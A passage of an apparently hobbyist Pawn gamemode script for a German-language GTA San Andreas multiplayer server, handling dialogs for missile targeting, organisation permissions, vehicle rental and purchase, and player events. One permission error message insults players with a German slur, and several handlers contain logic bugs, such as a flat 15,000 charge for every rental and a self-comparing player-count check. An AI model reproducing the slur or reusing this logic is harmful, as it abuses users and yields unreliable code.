	    ShowPlayerDialog(playerid,DIALOG_COP,DIALOG_STYLE_LIST,"Verbrechen klicken","Fahren ohne License\nStVO\nBesitz von Mats/Drogen\nVersuchtes Kidnapping\nFlucht\nversuchte Flucht\nBeihilfe zur Flucht\nVerweigerung\nBehinderung der Justiz\nWaffenhandel\nEinsperren ins GangJail\nBeamten/Zivilistenangriff\nEntführung\nBeamten-/Zivilistenbeschuss\nAnschlag\nMord\nBankraub\nPräsidentenbeschuss\nPräsidentenmord\nEinbruch in Area 51\nAusbruchshilfe aus Alcatraz","Auswählen","Beenden");
	    pVerbrecher[playerid] = clickedplayerid;
	}
	else
	{
		ShowPlayerDialog(playerid, DIALOG_CALL, DIALOG_STYLE_LIST, GetName(clickedplayerid), "SMS\nAnrufen", "Auswählen", "Abbrechen");
	    pCaller[playerid] = clickedplayerid;
	}
	return 1;
}


Function OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{

	if(dialogid == DIALOG_RAKETE)
	{
	    if(!response) return 0;
	    switch(listitem)
	    {
	        case 0:
	        {
	           ocmd_preparemissile(playerid, "");
			}
			case 1:
	        {
	          	ShowPlayerDialog(playerid, DIALOG_RAKETE_ZIELAUSWAHL, DIALOG_STYLE_LIST, "Ziel", "Ziel auf der Karte nehmen\nSpieler auflisten", "Auswählen", "Abbrechen");
			}
			case 2:
	        {
       			ocmd_launchmissile(playerid, "");
			}
		}
	}
	if(dialogid == DIALOG_RAKETE_ZIELAUSWAHL)
	{
	    if(!response) return 0;
        new strings[128],LocationZone[MAX_ZONE_NAME];

        new Float:x, Float:y, Float:z;


	    switch(listitem)
	    {
	        case 0:
	        {
	            if(CheckPointSetted[playerid] == 0) return SCM(playerid,-1,"Du hast auf der Karte kein Ziel markiert.(Du kannst nur 1 Ziel auswählen Spieler/Karte)");
	            KillTimer(RaketenSys[RakPlayerTimer]);
				SCM(playerid,-1,"Du hast das Ziel auf der Karte genommen.");
				RaketenSys[RaketenZiel] = 1;

			}
			case 1:
			{
			  //  for(new i = 0; i < MAX_PLAYERS; i++)
			    CheckPointSetted[playerid]= 0;
                RaketenSys[RaketenZiel] = 0;
			    for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
			    {
			        if(!IsPlayerConnected(i)) continue;
			        DialogTemp[playerid][DialogTempIndex[playerid]++] = i;
                    GetPlayerPos(i, x, y, z);
					Get2DZone(x,y, LocationZone, MAX_ZONE_NAME);
			        format(strings, sizeof(strings), "%s%s ( ID: %d ) Position: %s\n",strings,GetName(i),i,LocationZone);
				}
				ShowPlayerDialog(playerid,DIALOG_RAKETE_SPIELERAUSWAHL,DIALOG_STYLE_LIST,"Ziel Auswählen",strings,"Auswählen","Abbrechen");

			}
		}
	}
	if(dialogid == DIALOG_RAKETE_SPIELERAUSWAHL)
	{
	    if(!response) return 0;
	    new i = DialogTemp[playerid][listitem],strings[128];
	    RaketenSys[RaketenZiel] = 2;
	    if(i != INVALID_PLAYER_ID)
	    {
	        format(strings, sizeof(strings), "Du hast %s als Ziel markiert. Automatische Zielverfolgung wurde aktiviert",GetName(i));
	        SCM(playerid,-1,strings);
            RaketenSys[ZielID] = i;
	        RaketenSys[RakPlayerTimer] = SetTimerEx("UpdateXYZ", 500, 1,"i",i);

		}
	}
	if(dialogid == DIALOG_ORGVW)
	{
	    //ShowPlayerDialog(playerid,DIALOG_ORGVW,DIALOG_STYLE_LIST,"Organisationsverwaltung","Berechtigungen\nORG Fahrzuege\nORG Bizz\nBase","Auswählen","Abbrechen");

	    if(!response) return 0;
	    new strings[128],/*strings2[128]*,*/strings3[128],strings4[128],rest[512],org = PlayerInfo[playerid][pOrgMember];
	    switch(listitem)
	    {
	        case 0:
	        {
	            format(strings,sizeof(strings),"%s%s %s",strings,"Member können Fahrzeuge mieten:",((OrgInfo[org][membermiet] == 1)?("{6EF83C}[AN]"):("{ff0000}[AUS]")));
	           // format(strings2,sizeof(strings2),"%s%s %s",strings2,"Leader können kicken:",((OrgInfo[org][leaderkicker] == 1)?("{6EF83C}[AN]"):("{ff0000}[AUS]")));
	            format(strings3,sizeof(strings3),"%s%s %s",strings3,"Leader können Fahrzeuge kaufen:",((OrgInfo[org][leaderkaufer] == 1)?("{6EF83C}[AN]"):("{ff0000}[AUS]")));
	            format(strings4,sizeof(strings4),"%s%s %s",strings4,"Leader können auf ORGKasse zugreifen:",((OrgInfo[org][leaderkasser] == 1)?("{6EF83C}[AN]"):("{ff0000}[AUS]")));

	            format(rest, sizeof rest, "%s\n%s\n%s\n%s", strings,strings3,strings4);

	            ShowPlayerDialog(playerid,DIALOG_ORGVW_BERECHTIGUNGEN,DIALOG_STYLE_LIST,"Berechtigungen",rest,"Ändern","Abbrechen");
			}
			case 1:
	        {
	            new orgok = PlayerInfo[playerid][pOrgMember],mvstring[128];
	          //  autoorgid
	          /*
        		for(new i = 0; i < MAX_ORGANISATIONS; i++)
	        	{
	             if(OrgInfo[i][OrgValid] == 1)
	             {
	                if(OrgAuto[])
					{
						DialogTemp[playerid][DialogTempIndex[playerid]++] = i;
						format(mvstring, sizeof(mvstring), "%s ",mvstring,GetName(i),i,LocationZone,PlayerInfo[i][pTotTime]); // geht das ?
					}
				}*/
				for(new i;i<sizeof(OrgAuto);i++)// OrgFahrzeuge
				{
			        if(OrgAuto[orgok][orgvehtype] >= 400 && OrgAuto[orgok][orgvehtype] <= 611)
					{
			            if(OrgAuto[orgok][autoorgid] == org)
						{
						    new Float:x, Float:y, Float:z;

							GetVehiclePos(OrgAuto[i][LocalID], x, y, z);
							new LocationZone[MAX_ZONE_NAME];
							Get2DZone(x,y, LocationZone, MAX_ZONE_NAME);
					        format(mvstring, sizeof(mvstring), "%s %s Position: %s ",mvstring,CarName[OrgAuto[i][orgvehtype]-400],LocationZone);  // formatierung schon aber undefined symbol MVstring? GEHT DID?
						}

					}


				}
				ShowPlayerDialog(playerid,DIALOG_ORGVW_SHOWFAHRZEUGE,DIALOG_STYLE_LIST,"Organisationsfahrzeuge",mvstring,"Auswählen","Abbrechen");


			}
			case 2:
	        {

			}
			case 3:
	        {


			}
		}

	}



	if(dialogid == DIALOG_ORGVW_BERECHTIGUNGEN)
	{
	    if(!response) return 0;
	    new org = PlayerInfo[playerid][pOrgMember];

	    if(!strcmp(GetName(playerid), OrgInfo[org][OrgOwner], true))
		{

		    switch(listitem)
		    {
			        case 0:
			        {
						if(OrgInfo[org][membermiet] == 1)
						{
						    OrgInfo[org][membermiet] = 0;
						    SCM(playerid,-1,"Du hast Member Fahrzeuge Mieten {ff0000}ausgeschaltet.");
						}
						else
						{
						    OrgInfo[org][membermiet] = 1;
						    SCM(playerid,-1,"Du hast Member Fahrzeuge Mieten {6EF83C}angeschaltet.");
						}
					}
					/*
					case 1:
			        {
	                    if(OrgInfo[org][leaderkicker] == 1)
						{
						    OrgInfo[org][leaderkicker] = 0;
						    SCM(playerid,-1,"Du hast Leader können kicken {ff0000}ausgeschaltet.");
						}
						else
						{
						    OrgInfo[org][leaderkicker] = 1;
						    SCM(playerid,-1,"Du hast Leader können kicken  {6EF83C}angeschaltet.");
						}
					}*/
					case 1:
			        {
	                    if(OrgInfo[org][leaderkaufer] == 1)
						{
						    OrgInfo[org][leaderkaufer] = 0;
						    SCM(playerid,-1,"Du hast Leader könenn Fahrzeuge kaufen {ff0000}ausgeschaltet.");
						}
						else
						{
						    OrgInfo[org][leaderkaufer] = 1;
						    SCM(playerid,-1,"Du hast Leader könenn Fahrzeuge kaufen {6EF83C}angeschaltet.");
						}
					}
					case 2:
			        {
	                    if(OrgInfo[org][leaderkasser] == 1)
						{
						    OrgInfo[org][leaderkasser] = 0;
						    SCM(playerid,-1,"Du hast Leader können auf die ORG Kasse zugreifen {ff0000}ausgeschaltet.");
						}
						else
						{
						    OrgInfo[org][leaderkasser] = 1;
						    SCM(playerid,-1,"Du hast Leader können auf die ORG Kasse zugreifen {6EF83C}angeschaltet.");
						}
					}

			}
		}
		else return SCM(playerid,-1,"Du hurensohn bist kein org owner");
	}
	if(dialogid == DIALOG_EVSYSTEILNEHMEN)
	{
	    if(!response) return 0;
	    if(Event[EventActive] == 0) return SCM(playerid,-1,"Das Event an dem du teilnehmen wolltest ist nicht mehr aktiv.");

		if(GetEventCurrentPlayers() >= Event[EventMaxPlayers]) return SCM(playerid,-1,"Die maximale Spielerzahl für das Event wurde bereits erreicht!");
		//if(GetEventCurrentPlayers() >= Event[EventMaxPlayers]) return SCM(playerid,-1,"Die maximale Spielerzahl für das Event wurde bereits erreicht!");  // RICHTIG ?
		if(Event[EventGestartet] == 1) return SCM(playerid,-1,"Das Event hat bereits begonnen."); // speccen falls er teilnehmen könnte
		if(Event[EventArt] <2) return SCM(playerid,-1,"Ein Fehler ist aufgetreten. (EventArt <2) Bitte melde dies einem Administrator!"); // speccen falls er teilnehmen könnte

		switch(Event[EventArt])
		{
		    case 2:
		    {
		        SetPlayerInterior(playerid,Event[EventInterior]);  //hätte mir das evinterior eig auch sparen könnnen
		        SetPlayerVirtualWorld(playerid,Event[EventVWOk]);

		        new Random = random(sizeof(EventGranat));
			    SetPlayerPos(playerid, EventGranat[Random][0], EventGranat[Random][1], EventGranat[Random][2]);
			    SetPlayerFacingAngle(playerid, EventGranat[Random][3]);

			    TogglePlayerControllable(playerid,false);

			    PlayerInfo[playerid][AktivImEvent] = 1;
			}
		}
	}
	if(dialogid == DIALOG_HANDY)
	{
	    if(!response) return 0;
	    switch(listitem)
	    {
	        case 0:
	        {
	            OnPlayerCommandText(playerid,"/time");
			}
			case 1:
	        {
	           ShowPlayerDialog(playerid,DIALOG_HANDY_ANRUFEN,DIALOG_STYLE_INPUT,"Anrufen","Gib die Nummer ein, die du anrufen möchtest:","Anrufen","Abbrechen");
			}
			case 2:
	        {
	             ShowPlayerDialog(playerid,DIALOG_HANDY_SMS,DIALOG_STYLE_INPUT,"Anrufen","Gib die Nummer ein, der du eine SMS senden möchtest:","SMS","Abbrechen");
			}
			case 3:
	        {
	            if(PlayerInfo[playerid][pOrgMember] == 0) return 0;
	            new org = PlayerInfo[playerid][pOrgMember];
	           	if(org !=0)  // 0 niemals org haha exiertiert sogar wtf
				{
	            	ShowPlayerDialog(playerid,DIALOG_HANDY_ORGVW,DIALOG_STYLE_LIST,"Organisation","Fahrzeug Mieten\nFahrzeug für ORG Kaufen","Auswählen","Abbrechen");
	            }
	            else return SCM(playerid,-1,"Du bist nicht in einer ORG!");

			}
		}
	}

	if(dialogid == DIALOG_HANDY_ORGVW)
	{

	    if(!response) return 0;
	    new org = PlayerInfo[playerid][pOrgMember];
	    switch(listitem)
	    {
	        case 0:

	    //    leaderkaufer
	        {
	            if(PlayerInfo[playerid][pOrgLeader] !=org)
	            {
                    if(OrgInfo[org][membermiet] == 0) return SCM(playerid,-1,"Du kannst kein Fahrzeug für die ORG mieten, da es in den Einstellungen deiner ORG deaktiviert wurde!");
				}
                ShowPlayerDialog(playerid,DIALOG_HANDY_FMIETEN,DIALOG_STYLE_LIST,"Fahrzeug Mieten","Admiral($15.000)\nNRG-500($25.000)\nBullet($20.000)\nLandstalker($2.000)\nFiretruck($9.999)","Mieten","Abbrechen");
			}
			case 1:
	        {
	            if(OrgInfo[org][leaderkaufer] == 0) return SCM(playerid,-1,"Du kannst kein Fahrzeug für die ORG Kaufen, da es in den Einstellungen deiner ORG deaktiviert wurde!");
				SCM(playerid,-1,"Info: Der Kauf ist sofort verbindlich");
    			ShowPlayerDialog(playerid,DIALOG_HANDY_FKAUFEN,DIALOG_STYLE_LIST,"Fahrzeug Kaufen","Stretch(450.00$)\nNRG-500($500.000)\nBullet($350.000)\nLandstalker($70.000)\nFiretruck($125.000)\nSultan($220.000)\nElegant($50.000)\nStallion($10.000)","Kaufen","Abbrechen");
			}
		}
	}


	if(dialogid == DIALOG_HANDY_FKAUFEN)
	{
	    if(!response) return 0;
		new org = PlayerInfo[playerid][pOrgMember];//,string[128];
		new Float:okayposx, Float:okayposy, Float:okayposz;
		GetPlayerPos(playerid, okayposx, okayposy, okayposz);
	    switch(listitem)
	    {
	        case 0:
	        {
	            if(OrgInfo[org][FahrzeugeRows] > ORG_MAX_POSSIBLE_CARS) return SCM(playerid,-1,"Deine ORG hat die maximale Anzahl an gekauften Fahrzeugen bereits erreicht!");
	            if(OrgInfo[org][OrgKasse] < 450000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 450.000$)");
					// if wanteds USW interior jail checkpoints

     			OrgAutoErstellen(playerid,org,409,450000);
			}
			case 1:
	        {
	            if(OrgInfo[org][FahrzeugeRows] > ORG_MAX_POSSIBLE_CARS) return SCM(playerid,-1,"Deine ORG hat die maximale Anzahl an gekauften Fahrzeugen bereits erreicht!");
	            if(OrgInfo[org][OrgKasse] < 350000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 350.000$)");
     			OrgAutoErstellen(playerid,org,522,350000);
			}
			case 2:
	        {
	            if(OrgInfo[org][FahrzeugeRows] > ORG_MAX_POSSIBLE_CARS) return SCM(playerid,-1,"Deine ORG hat die maximale Anzahl an gekauften Fahrzeugen bereits erreicht!");
	            if(OrgInfo[org][OrgKasse] < 450000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 450.000$)");
					// if wanteds USW interior jail checkpoints

     			OrgAutoErstellen(playerid,org,541,450000);
			}
			case 3:
	        {
	            if(OrgInfo[org][FahrzeugeRows] > ORG_MAX_POSSIBLE_CARS) return SCM(playerid,-1,"Deine ORG hat die maximale Anzahl an gekauften Fahrzeugen bereits erreicht!");
	            if(OrgInfo[org][OrgKasse] < 70000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 70.000$)");
					// if wanteds USW interior jail checkpoints

     			OrgAutoErstellen(playerid,org,400,70000);
			}
			case 4:
	        {
	            if(OrgInfo[org][FahrzeugeRows] > ORG_MAX_POSSIBLE_CARS) return SCM(playerid,-1,"Deine ORG hat die maximale Anzahl an gekauften Fahrzeugen bereits erreicht!");
	            if(OrgInfo[org][OrgKasse] < 125000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 125.000$)");
					// if wanteds USW interior jail checkpoints

     			OrgAutoErstellen(playerid,org,544,125000); // NEIN FIRETRUCK
			}
			case 5:
	        {
	            if(OrgInfo[org][FahrzeugeRows] > ORG_MAX_POSSIBLE_CARS) return SCM(playerid,-1,"Deine ORG hat die maximale Anzahl an gekauften Fahrzeugen bereits erreicht!");
	            if(OrgInfo[org][OrgKasse] < 220000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 220.000$)");
					// if wanteds USW interior jail checkpoints

     			OrgAutoErstellen(playerid,org,560,220000);
			}
			case 6:
	        {
	            if(OrgInfo[org][FahrzeugeRows] > ORG_MAX_POSSIBLE_CARS) return SCM(playerid,-1,"Deine ORG hat die maximale Anzahl an gekauften Fahrzeugen bereits erreicht!");
	            if(OrgInfo[org][OrgKasse] < 50000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 50.000$)");
					// if wanteds USW interior jail checkpoints

     			OrgAutoErstellen(playerid,org,507,50000);
			}
			case 7:
	        {
	            if(OrgInfo[org][FahrzeugeRows] > ORG_MAX_POSSIBLE_CARS) return SCM(playerid,-1,"Deine ORG hat die maximale Anzahl an gekauften Fahrzeugen bereits erreicht!");
	            if(OrgInfo[org][OrgKasse] < 10000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 10.000$)");
					// if wanteds USW interior jail checkpoints

     			OrgAutoErstellen(playerid,org,439,10000);
			}
		}
	}

	if(dialogid == DIALOG_HANDY_FMIETEN) //s ound
	{
		if(!response) return 0;
		new org = PlayerInfo[playerid][pOrgMember],string[128];
		new Float:okayposx, Float:okayposy, Float:okayposz;
		GetPlayerPos(playerid, okayposx, okayposy, okayposz);
	    switch(listitem)
	    {
	        case 0:
	        {
	            if(OrgInfo[org][FahrzeugGemietet] > 0)
				{
				   // CarName[car-400]
				    format(string, sizeof(string), "Deine Fraktion hat bereits ein Fahrzeug (%s) gemietet!", CarName[OrgInfo[org][FahrzeugGemietet]-400]);
			 		SCM(playerid,-1,string);
			 		return 1;
				}
				if(OrgInfo[org][OrgKasse] < 15000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 15.000$)");
                OrgInfo[org][FahrzeugGemietet] = 445;
                CreateVehicle(445,okayposx+3,okayposy,okayposz,0.0,1,1,-1,0);
                OrgInfo[org][OrgKasse] -=15000;

			}
			case 1:
	        {
				if(OrgInfo[org][FahrzeugGemietet] > 0)
				{
				   // CarName[car-400]
				    format(string, sizeof(string), "Deine Fraktion hat bereits ein Fahrzeug (%s) gemietet!", CarName[OrgInfo[org][FahrzeugGemietet]-400]);
			 		SCM(playerid,-1,string);
			 		return 1;
				}
				if(OrgInfo[org][OrgKasse] < 25000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 25.000$)");
                OrgInfo[org][FahrzeugGemietet] = 522;
                CreateVehicle(522,okayposx+3,okayposy,okayposz,0.0,1,1,-1,0);
                OrgInfo[org][OrgKasse] -=15000;
			}
	        case 2:
	        {
                if(OrgInfo[org][FahrzeugGemietet] > 0)
				{
				   // CarName[car-400]
				    format(string, sizeof(string), "Deine Fraktion hat bereits ein Fahrzeug (%s) gemietet!", CarName[OrgInfo[org][FahrzeugGemietet]-400]);
			 		SCM(playerid,-1,string);
			 		return 1;
				}
				if(OrgInfo[org][OrgKasse] < 20000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 20.000$)");
                OrgInfo[org][FahrzeugGemietet] = 541;
                CreateVehicle(541,okayposx+3,okayposy,okayposz,0.0,1,1,-1,0);
                OrgInfo[org][OrgKasse] -=15000;
			}
			case 3:
	        {
                if(OrgInfo[org][FahrzeugGemietet] > 0)
				{
				   // CarName[car-400]
				    format(string, sizeof(string), "Deine Fraktion hat bereits ein Fahrzeug (%s) gemietet!", CarName[OrgInfo[org][FahrzeugGemietet]-400]);
			 		SCM(playerid,-1,string);
			 		return 1;
				}
				if(OrgInfo[org][OrgKasse] < 2000) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 2000$)");
                OrgInfo[org][FahrzeugGemietet] = 400;
                CreateVehicle(400,okayposx+3,okayposy,okayposz,0.0,1,1,-1,0);
                OrgInfo[org][OrgKasse] -=15000;
			}
			case 4:
	        {
                if(OrgInfo[org][FahrzeugGemietet] > 0)
				{
				   // CarName[car-400]
				    format(string, sizeof(string), "Deine Fraktion hat bereits ein Fahrzeug (%s) gemietet!", CarName[OrgInfo[org][FahrzeugGemietet]-400]);
			 		SCM(playerid,-1,string);
			 		return 1;
				}
				if(OrgInfo[org][OrgKasse] < 9999) return SCM(playerid,-1,"In der ORG Kasse ist nicht genud Geld! (mindestens 9.999$)");
                OrgInfo[org][FahrzeugGemietet] = 544;
                CreateVehicle(544,okayposx+3,okayposy,okayposz,0.0,1,1,-1,0);
                OrgInfo[org][OrgKasse] -=15000;
			}
		}
		SCM(playerid,-1,"Fahrzeug erfolgreich gemietet!");
	}
	/*
	OrgKasse,
	FahrzeugGemietet*/
	if(dialogid == DIALOG_EVSYS)
	{
	    if(!response) return 0;
	    switch(listitem)
	    {
	        case 0:
	        {
	            if(Event[EventActive] == 1) return SCM(playerid,EVENTCOLOR,"[EventSystem]: Ein Event läuft bereits! Beende es mit /stopevent oder /event");
	            ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTEN,DIALOG_STYLE_LIST,"Event Starten","Event Art\nEvent Zeit\nEvent Max Players\nEvent Min Players\nEvent Wartezeit\n{0101DF}Event Starten","Fortfahren","Abbrechen");
			}
			case 1:
	        {
	            if(Event[EventActive] == 0) return SCM(playerid,EVENTCOLOR,"[EventSystem]: Derzeit ist kein Event aktiv!");
	            SCM(playerid,EVENTCOLOR,"[EventSystem]: Du hast das Event Beendet!");
	            Event[AdminEnde] = 1;
	            Event[AdminEndeWer] = playerid;
	            EventEnde();
			}
			case 2:
	        {
	            if(Event[EventEdit] == 1) return SCM(playerid,-1,"Das aktive Event wird bereits von einem Admin bearbeitet!");
	            if(Event[EventActive] == 0) return SCM(playerid,EVENTCOLOR,"[EventSystem]: Derzeit ist kein Event aktiv!");
	            ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTEN,DIALOG_STYLE_LIST,"Event Starten","Event Art\nEvent Zeit\nEvent Max Players\nEvent Min Players\nEvent Wartezeit\n{0101DF}Event Starten","Fortfahren","Abbrechen");
			}
		}
	}
	if(dialogid == DIALOG_EVSYSSTARTEN)
	{
        if(!response) return 0;
        if(Event[EventActive] == 1) return SCM(playerid,EVENTCOLOR,"[EventSystem]: Derzeit ist ein Event aktiv!");
	    switch(listitem)
	    {
	        case 0:
	        {
	            if(!response) { Event[EventEdit] = 0; return 0;}
	            Event[EventEdit] = 1;
	            ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTENGRANAT,DIALOG_STYLE_LIST,"Event Art","GranatenBall\n","Setzen","Abbrechen");
			}
			case 1:
	        {
	            if(!response) { Event[EventEdit] = 0; return 0;}
	            Event[EventEdit] = 1;
	            ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTENZEIT,DIALOG_STYLE_INPUT,"Event Zeit","Bitte tippe die Event-Zeit in Minuten ein! (min: 3)\n","Setzen","Abbrechen");
			}
			case 2:
	        {
	            if(!response) { Event[EventEdit] = 0; return 0;}
	            Event[EventEdit] = 1;
                ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTENMAXPLAYERS,DIALOG_STYLE_INPUT,"Event Max Players","Bitte tippe die Maximale Spielerzahl ein!\n","Setzen","Abbrechen");
			}
			case 3:
	        {
	            if(!response) { Event[EventEdit] = 0; return 0;}
	            Event[EventEdit] = 1;
                ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTENMINPLAYERS,DIALOG_STYLE_INPUT,"Event Min Players","Bitte tippe die minimale Spielerzahl ein!\n","Setzen","Abbrechen");
			}
			case 4:
			{
			    if(!response) { Event[EventEdit] = 0; return 0;}
			    Event[EventEdit] = 1;

			    ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTENWARTEZEIT,DIALOG_STYLE_INPUT,"Event Wartezeit","Vorgeben wie lange der Server nach dem erreichen der minimalen Spielerzahlen warten soll. 0 für garnicht.\n","Setzen","Abbrechen");
			}
			case 5:
			{
			    if(!response) { Event[EventEdit] = 0; return 0;}
			    if(Event[EventArt] == 0 || Event[EventZeit] == 0 || Event[EventMaxPlayers] == 0 || Event[EventMinPlayers] == 0){ SCM(playerid,EVENTCOLOR,"[EventSystem]: Du hast noch nicht alle Parameter ausgefüllt!(EventZeit oder Max Players ,Min Players, EventArt"); ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTEN,DIALOG_STYLE_LIST,"Event Starten","Event Art\nEvent Zeit\nEvent Max Players\nEvent Min Players\nEvent Wartezeit\n{0101DF}Event Starten","Fortfahren","Abbrechen"); return 1;}
			    if(Event[EventMinPlayers] > Event[EventMinPlayers]) { SCM(playerid,EVENTCOLOR,"[EventSystem]: Die minimale Spielerzahl kann nicht höher > als die maximale sein!"); ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTEN,DIALOG_STYLE_LIST,"Event Starten","Event Art\nEvent Zeit\nEvent Max Players\nEvent Min Players\nEvent Wartezeit\n{0101DF}Event Starten","Fortfahren","Abbrechen"); return 1;}
			    Event[EventEdit] = 0;
				EventStart(playerid);

			}
		}
	}
	if(dialogid == DIALOG_EVSYSSTARTENGRANAT)
	{
	    if(!response) { Event[EventEdit] = 0; return 0;}
	    switch(listitem)
	    {
	        case 0:
	        {
				Event[EventArt] = 2;
				SCM(playerid,EVENTCOLOR,"[EventSystem]: Du hast die Event-Art auf Granaten-Ball geändert!");
				SCM(playerid,EVENTCOLOR,"[EventSystem]: GRANATENBALL: Für dieses Event wird eine Spielerzahl von 25 Spielern empfohlen. (12 Spawns verfügbar)");
				ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTEN,DIALOG_STYLE_LIST,"Event Starten","Event Art\nEvent Zeit\nEvent Max Players\nEvent Min Players\nEvent Wartezeit\n{0101DF}Event Starten","Fortfahren","Abbrechen");
			}
		}
	}
	if(dialogid == DIALOG_EVSYSSTARTENZEIT)
	{
	    new string[128];
	    if(!response) { Event[EventEdit] = 0; return 0; }
	    if(!IsNumeric(inputtext)) { SCM(playerid,-1,"Nur Zahlen!"); ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTENZEIT,DIALOG_STYLE_INPUT,"Event Zeit","Bitte tippe die Event-Zeit in Minuten ein! (min: 3)\n","Setzen","Abbrechen"); return 1;}

	    if(strval(inputtext) < 3)  return SCM(playerid,EVENTCOLOR,"[EventSystem]: Das Event muss mindestens 3 Minuten dauern!");

	    Event[EventZeit] = strval(inputtext);
	    format(string, sizeof(string), "[EventSystem]: Du hast die Event-Zeit auf %d:00 Minuten gesetzt!", Event[EventZeit]);
	    SCM(playerid,EVENTCOLOR,string);
	    ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTEN,DIALOG_STYLE_LIST,"Event Starten","Event Art\nEvent Zeit\nEvent Max Players\nEvent Min Players\nEvent Wartezeit\n{0101DF}Event Starten","Fortfahren","Abbrechen");

	    // EventZeit setzen LEl
	}
	if(dialogid == DIALOG_EVSYSSTARTENMAXPLAYERS)
	{
	    new string[128];
	    if(!response) { Event[EventEdit] = 0; return 0;}
	    if(!IsNumeric(inputtext))  { SCM(playerid,-1,"Nur Zahlen!"); ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTENMAXPLAYERS,DIALOG_STYLE_INPUT,"Event Max Players","Bitte tippe die Maximale Spielerzahl ein!\n","Setzen","Abbrechen"); return 1;}
	    Event[EventMaxPlayers] = strval(inputtext);
	    format(string, sizeof(string), "[EventSystem]: Du hast die maximale Spielerzahl für das Event auf %d gesetzt!", Event[EventMaxPlayers]);
	    SCM(playerid,EVENTCOLOR,string);
	    ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTEN,DIALOG_STYLE_LIST,"Event Starten","Event Art\nEvent Zeit\nEvent Max Players\nEvent Min Players\nEvent Wartezeit\n{0101DF}Event Starten","Fortfahren","Abbrechen");
	}
	if(dialogid == DIALOG_EVSYSSTARTENMINPLAYERS)
	{
	    new string[128];
	    if(!response) { Event[EventEdit] = 0; return 0;}
	    if(!IsNumeric(inputtext)) { SCM(playerid,-1,"Nur Zahlen!"); ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTENMINPLAYERS,DIALOG_STYLE_INPUT,"Event Min Players","Bitte tippe die minimale Spielerzahl ein!\n","Setzen","Abbrechen"); return 1;}
	    Event[EventMinPlayers] = strval(inputtext);
	    format(string, sizeof(string), "[EventSystem]: Du hast die minimale Spielerzahl für das Event auf %d gesetzt!", Event[EventMinPlayers]);
	    SCM(playerid,EVENTCOLOR,string);
	    ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTEN,DIALOG_STYLE_LIST,"Event Starten","Event Art\nEvent Zeit\nEvent Max Players\nEvent Min Players\nEvent Wartezeit\n{0101DF}Event Starten","Fortfahren","Abbrechen");
	}

	if(dialogid == DIALOG_EVSYSSTARTENWARTEZEIT)
	{
	    new string[128];
	    if(!response) { Event[EventEdit] = 0; return 0;}
	    if(!IsNumeric(inputtext)) { SCM(playerid,-1,"Nur Zahlen!"); ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTENWARTEZEIT,DIALOG_STYLE_INPUT,"Event Wartezeit","Vorgeben wie lange der Server nach dem erreichen der minimalen Spielerzahlen warten soll. 0 für garnicht.\n","Setzen","Abbrechen"); return 1;}
	    Event[EventWarteZeit] = strval(inputtext);
	    format(string, sizeof(string), "[EventSystem]: Du hast die Wartezeit für das Event auf %d Minuten gesetzt!", Event[EventWarteZeit]);
	    SCM(playerid,EVENTCOLOR,string);
	    ShowPlayerDialog(playerid,DIALOG_EVSYSSTARTEN,DIALOG_STYLE_LIST,"Event Starten","Event Art\nEvent Zeit\nEvent Max Players\nEvent Min Players\nEvent Wartezeit\n{0101DF}Event Starten","Fortfahren","Abbrechen");
	}

























	if(dialogid == DIALOG_FBUDGET)
	{
	    if(!response) return 0;
	    new string[256];
	    switch(listitem)
	    {
	        case 0:
	        {
	            format(string, sizeof(string), "Das Tägliche Budget für die Polzei Los Santos liegt derzeit bei $%d\nAuf welchen Wert möchtest du es setzten?", Staat[LSPDBudget]);
	            ShowPlayerDialog(playerid, DIALOG_FBUDGET2, DIALOG_STYLE_INPUT, "Budget", string, "Bestätigen", "Abbrechen");
	            SetPVarInt(playerid,"Budget",1);

			}
			case 1:
	        {
	            format(string, sizeof(string), "Das Tägliche Budget für die FBI von San Andreas liegt derzeit bei $%d\nAuf welchen Wert möchtest du es setzten?", Staat[FBIBudget]);
	            ShowPlayerDialog(playerid, DIALOG_FBUDGET2, DIALOG_STYLE_INPUT, "Budget", string, "Bestätigen", "Abbrechen");
	            SetPVarInt(playerid,"Budget",2);
			}
			case 2:
	        {
	            format(string, sizeof(string), "Das Tägliche Budget für die Bundeswehr von San Andreas liegt derzeit bei $%d\nAuf welchen Wert möchtest du es setzten?", Staat[ArmyBudget]);
	            ShowPlayerDialog(playerid, DIALOG_FBUDGET2, DIALOG_STYLE_INPUT, "Budget", string, "Bestätigen", "Abbrechen");
	            SetPVarInt(playerid,"Budget",3);
			}
		}
	}
	if(dialogid == DIALOG_FBUDGET2)
	{
	    if(!response) return 0;
	    new budget = GetPVarInt(playerid,"Budget");
	    if(!IsNumeric(inputtext)) return SCM(playerid,-1,"Nur Zahlen!");
	    new string[256];
